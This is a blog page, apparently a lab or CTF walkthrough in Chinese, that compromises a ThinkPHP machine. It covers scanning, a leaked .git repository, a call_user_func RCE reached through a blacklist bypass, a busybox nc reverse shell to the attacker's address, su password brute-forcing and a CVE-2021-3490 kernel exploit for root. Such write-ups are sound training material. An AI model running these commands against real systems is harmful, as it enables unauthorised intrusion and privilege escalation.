@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='//gc.zgo.at/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# 一、信息收集
+
+## 1. 主机发现
+
+首先，在当前网段内进行主机发现，确定目标IP地址。">
+<meta property="og:title" content="内部_tpN">
+<meta property="og:description" content="# 一、信息收集
+
+## 1. 主机发现
+
+首先，在当前网段内进行主机发现，确定目标IP地址。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_tpN.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>内部_tpN</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_tpN</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/215" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
+<h2>1. 主机发现</h2>
+<p>首先，在当前网段内进行主机发现，确定目标IP地址。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l           
+...
+192.168.205.131 08:00:27:2b:fe:37       PCS Systemtechnik GmbH
+...</pre></div>
+<p>发现存活主机 <code class="notranslate">192.168.205.131</code>。</p>
+<h2>2. 端口扫描</h2>
+<p>使用 Nmap 对目标主机进行全端口扫描，以识别开放的服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.131
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 20:21 EDT
+Nmap scan report <span class="pl-k">for</span> 192.168.205.131
+Host is up (0.00017s latency).
+Not shown: 65534 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+MAC Address: 08:00:27:2B:FE:37 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+...</pre></div>
+<p>扫描结果显示目标开放了两个端口：</p>
+<ul>
+<li><strong>22/tcp</strong>: SSH 服务</li>
+<li><strong>8080/tcp</strong>: HTTP 服务</li>
+</ul>
+<h1>二、Web渗透</h1>
+<h2>1. Web应用识别</h2>
+<p>访问 <code class="notranslate">http://192.168.205.131:8080</code>，页面显示为一个赛博朋克风格的网站。</p>
+<div class="highlight highlight-text-html-basic"><pre class="notranslate"><span class="pl-kos">&lt;</span><span class="pl-ent">body</span><span class="pl-kos">&gt;</span>
+    <span class="pl-kos">&lt;</span><span class="pl-ent">h1</span><span class="pl-kos">&gt;</span>欢迎来到赛博朋克世界<span class="pl-kos">&lt;/</span><span class="pl-ent">h1</span><span class="pl-kos">&gt;</span>
+    <span class="pl-kos">&lt;</span><span class="pl-ent">p</span><span class="pl-kos">&gt;</span>这是一个使用ThinkPHP构建的赛博朋克风格的RCE。<span class="pl-kos">&lt;/</span><span class="pl-ent">p</span><span class="pl-kos">&gt;</span>
+    ...
+<span class="pl-kos">&lt;/</span><span class="pl-ent">body</span><span class="pl-kos">&gt;</span></pre></div>
+<p>页面明确指出该应用是使用 <strong>ThinkPHP</strong> 框架构建的。</p>
+<h2>2. 目录与漏洞扫描</h2>
+<p>使用 <code class="notranslate">gobuster</code> 进行目录扫描，发现大量文件，但信息较为杂乱。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ gobuster dir -u http://192.168.205.131:8080 -w ...
+...
+/index.php            (Status: 200) [Size: 2295]
+/robots.txt           (Status: 200) [Size: 24]
+/system.zip           (Status: 200) [Size: 22]
+...</pre></div>
+<p>使用 <code class="notranslate">nuclei</code> 进行自动化漏洞扫描，发现 <code class="notranslate">phpinfo.php</code> 泄露和 <code class="notranslate">.gitignore</code> 文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nuclei -u http://192.168.205.131:8080
+...
+[phpinfo-files] [http] [low] http://192.168.205.131:8080/phpinfo.php ...
+[exposed-gitignore] [http] [info] http://192.168.205.131:8080/.gitignore
+...</pre></div>
+<p>访问 <code class="notranslate">.gitignore</code> 文件，发现了一些被排除在版本控制之外的路径和文件，如 <code class="notranslate">.env</code> 和 <code class="notranslate">/vendor</code> 目录，这些通常包含敏感信息。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl http://192.168.205.131:8080/.gitignore          
+<span class="pl-k">*</span>.log
+.env
+composer.phar
+...
+/vendor
+...</pre></div>
+<p>尝试访问 <code class="notranslate">.env</code> 文件，虽然没有直接获取到配置信息，但返回的错误页面暴露了框架的详细版本：<strong>ThinkPHP V8.1.3</strong>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl http://192.168.205.131:8080/.env
+...
+<span class="pl-k">&lt;</span>div class=<span class="pl-s"><span class="pl-pds">"</span>copyright<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
+    <span class="pl-k">&lt;</span>a title=<span class="pl-s"><span class="pl-pds">"</span>官方网站<span class="pl-pds">"</span></span> href=<span class="pl-s"><span class="pl-pds">"</span>http://www.thinkphp.cn<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>ThinkPHP<span class="pl-k">&lt;</span>/a<span class="pl-k">&gt;</span> 
+    <span class="pl-k">&lt;</span>span<span class="pl-k">&gt;</span>V8.1.<span class="pl-k">3&lt;</span>/span<span class="pl-k">&gt;</span> 
+    ...
+<span class="pl-k">&lt;</span>/div<span class="pl-k">&gt;</span>
+...</pre></div>
+<h2>3. Git源码泄露</h2>
+<p>使用 <code class="notranslate">dirsearch</code> 进一步扫描，确认了 <code class="notranslate">.git</code> 目录的存在，这意味着网站源码可能被泄露。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -u http://192.168.205.131:8080  
+...
+[20:35:40] 301 -  324B  - /.git  -<span class="pl-k">&gt;</span>  http://192.168.205.131:8080/.git/
+...</pre></div>
+<p>使用 <code class="notranslate">git-dumper</code> 工具将泄露的 <code class="notranslate">.git</code> 仓库完整下载到本地。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ git-dumper http://192.168.205.131:8080/ <span class="pl-c1">.</span>                
+...
+[-] Running git checkout <span class="pl-c1">.</span>
+从索引区更新了 71 个路径</pre></div>
+<h2>4. 代码审计</h2>
+<p>下载源码后，对关键文件进行审计，寻找漏洞。</p>
+<ul>
+<li>
+<p><strong><code class="notranslate">app/admin/controller/Admin.php</code></strong>:<br>
+在 <code class="notranslate">Admin</code> 控制器中发现一个 <code class="notranslate">hello</code> 方法，其核心代码为 <code class="notranslate">call_user_func($b, $a);</code>。这是一个典型的命令执行漏洞，其中参数 <code class="notranslate">$a</code> 和 <code class="notranslate">$b</code> 均可通过URL传入，意味着我们可以控制调用的函数（<code class="notranslate">$b</code>）和其参数（<code class="notranslate">$a</code>）。</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-k">public</span> <span class="pl-k">function</span> <span class="pl-en">hello</span>(<span class="pl-s1"><span class="pl-c1">$</span>a</span>,<span class="pl-s1"><span class="pl-c1">$</span>b</span>)
+{
+    <span class="pl-en">call_user_func</span>(<span class="pl-s1"><span class="pl-c1">$</span>b</span>, <span class="pl-s1"><span class="pl-c1">$</span>a</span>); <span class="pl-c">// 漏洞点</span>
+}</pre></div>
+</li>
+<li>
+<p><strong><code class="notranslate">app/admin/route/app.php</code></strong>:<br>
+路由文件显示，<code class="notranslate">sb/:a/:b</code> 路径被绑定到了 <code class="notranslate">Admin/hello</code> 方法。开发者注释“不知道为什么我这个路由是无效的”，但实际上，由于应用映射的配置 (<code class="notranslate">'app_map' =&gt; ["think"=&gt;"admin"]</code>)，访问路径应为 <code class="notranslate">/think/admin/hello/...</code>。</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate">Route::<span class="pl-en">rule</span>(<span class="pl-s">"<span class="pl-s">sb/:a/:b</span>"</span>,<span class="pl-s">"<span class="pl-s">Admin/hello</span>"</span>);</pre></div>
+</li>
+<li>
+<p><strong><code class="notranslate">app/middleware/Check1.php</code></strong>:<br>
+<code class="notranslate">Admin</code> 控制器使用了 <code class="notranslate">Check1</code> 中间件，它会校验 <code class="notranslate">Session</code> 中的 <code class="notranslate">sb</code> 和 <code class="notranslate">token</code> 是否相等且不为空，这是一个简单的身份验证。</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-k">if</span> ((Session::<span class="pl-en">get</span>(<span class="pl-s">"<span class="pl-s">sb</span>"</span>)==Session::<span class="pl-en">get</span>(<span class="pl-s">"<span class="pl-s">token</span>"</span>)&amp;&amp;!<span class="pl-en">empty</span>(Session::<span class="pl-en">get</span>(<span class="pl-s">"<span class="pl-s">sb</span>"</span>))&amp;&amp;!<span class="pl-en">empty</span>(Session::<span class="pl-en">get</span>(<span class="pl-s">"<span class="pl-s">token</span>"</span>)))){
+    <span class="pl-k">return</span> <span class="pl-s1"><span class="pl-c1">$</span>next</span>(<span class="pl-s1"><span class="pl-c1">$</span>request</span>);
+}</pre></div>
+</li>
+<li>
+<p><strong><code class="notranslate">app/middleware/Check.php</code></strong>:<br>
+存在一个全局中间件，通过黑名单正则过滤URL中的危险函数，如 <code class="notranslate">system</code>, <code class="notranslate">exec</code>, <code class="notranslate">eval</code> 等。但 <code class="notranslate">passthru</code> 等函数并未在黑名单中，可以绕过。</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-s1"><span class="pl-c1">$</span>pattern</span> = <span class="pl-s">'<span class="pl-s">/\b(eval|exec|system|...|phpinfo)\b/i</span>'</span>;</pre></div>
+</li>
+</ul>
+<h1>三、漏洞利用</h1>
+<h2>1. 获取Token</h2>
+<p>根据代码审计，需要先获取一个合法的 <code class="notranslate">token</code> 才能访问后台控制器。<code class="notranslate">app/index/controller/Token.php</code> 文件逻辑显示，向 <code class="notranslate">/index.php/index/token/token</code> 发送 <code class="notranslate">sb=admin</code> 的POST请求即可获得<code class="notranslate">token</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl http://192.168.205.131:8080/index.php/index/token/token -d <span class="pl-s"><span class="pl-pds">"</span>sb=admin<span class="pl-pds">"</span></span> -c cookie.txt
+...
+<span class="pl-k">&lt;</span>p class=<span class="pl-s"><span class="pl-pds">"</span>message<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>获取成功: 2fce588f94d6d5edcfea90156254f130a4aed<span class="pl-k">575&lt;</span>/p<span class="pl-k">&gt;</span>
+...</pre></div>
+<h2>2. RCE执行命令</h2>
+<p>携带上一步获取的<code class="notranslate">cookie</code>，构造Payload访问漏洞路由。我们使用 <code class="notranslate">passthru</code> 函数绕过黑名单检测，执行 <code class="notranslate">id</code> 命令。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl http://192.168.205.131:8080/think/admin/hello/a/id/b/passthru -b cookie.txt
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
+<p>命令成功执行，当前用户为 <code class="notranslate">www-data</code>。</p>
+<h2>3. 反弹Shell</h2>
+<p>在本地监听端口：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 8888                        
+listening on [any] 8888 ...</pre></div>
+<p>构造反弹Shell的Payload，并进行URL编码后发送：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ curl http://192.168.205.131:8080/think/admin/hello/a/busybox%20nc%20192%2E168%2E205%2E128%208888%20%2De%20bash/b/passthru -b cookie.txt</pre></div>
+<p>成功接收到反弹Shell，并使用<code class="notranslate">script</code>和<code class="notranslate">stty</code>等命令升级为交互式TTY。</p>
+<h1>四、权限提升</h1>
+<h2>1. 用户切换</h2>
+<p>在 <code class="notranslate">/home</code> 目录下发现 <code class="notranslate">welcome</code> 用户，并在其家目录中找到一个名为 <code class="notranslate">.pwd</code> 的可疑文件，这可能是一个密码字典。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@tpN:/home/welcome$ ls -al
+...
+-rw-r--r-- 1 root    root    3510 Jul 22 09:56 .pwd
+-rw-r--r-- 1 root    root      26 Jul 24 09:27 uesr.txt</pre></div>
+<p>将<code class="notranslate">suForce</code>上传到目标服务器，并使用<code class="notranslate">suForce</code>工具进行爆破。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@tpN:/tmp$ ./suForce -u welcome -w pass
+...
+💥 Password <span class="pl-k">|</span> eecho
+...</pre></div>
+<p>成功爆破出 <code class="notranslate">welcome</code> 用户的密码为 <code class="notranslate">eecho</code>。切换用户成功。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@tpN:/tmp$ su welcome
+Password: eecho
+welcome@tpN:/tmp$ id
+uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)</pre></div>
+<h2>2. 内核漏洞提权</h2>
+<p>切换到 <code class="notranslate">welcome</code> 用户后，执行 <code class="notranslate">sudo -l</code> 发现没有sudo权限。上传并运行 <code class="notranslate">linpeas.sh</code> 脚本进行提权漏洞扫描，发现系统内核可能存在 <strong><a title="CVE-2021-3490" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-9wfm-q59x-qc3x/hovercard" href="https://github.com/advisories/GHSA-9wfm-q59x-qc3x">CVE-2021-3490</a></strong> 漏洞。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">...
+[+] [CVE-2021-3490] eBPF ALU32 bounds tracking <span class="pl-k">for</span> bitwise ops
+   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
+   Exposure: probable
+...</pre></div>
+<p>下载并编译该漏洞的exploit。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@tpN:/tmp$ busybox wget https://.../CVE-2021-3490/zip/main
+welcome@tpN:/tmp$ unzip main 
+welcome@tpN:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main$ make
+gcc -DGROOVY -o bin/exploit.bin -I include/ exploit.c bpf.c kmem_search.c</pre></div>
+<p>执行exploit，成功获取root权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@tpN:/tmp/Linux_LPE_eBPF_CVE-2021-3490-main/bin$ ./exploit.bin 
+...
+[<span class="pl-k">!</span>] preparing to overwrite creds...
+[+] success<span class="pl-k">!</span> enjoy r00t :)
+<span class="pl-c"><span class="pl-c">#</span> id</span>
+uid=0(root) gid=0(root) groups=0(root),1000(welcome)</pre></div>
+<h1>五、夺取Flag</h1>
+<p>在root权限下，读取用户和root的flag。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@tpN:/<span class="pl-c"><span class="pl-c">#</span> cat /root/root.txt /home/welcome/uesr.txt </span>
+flag{root-不错不错}
+flag{user-eecho123456789}</pre></div>
+<p>渗透测试完成。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
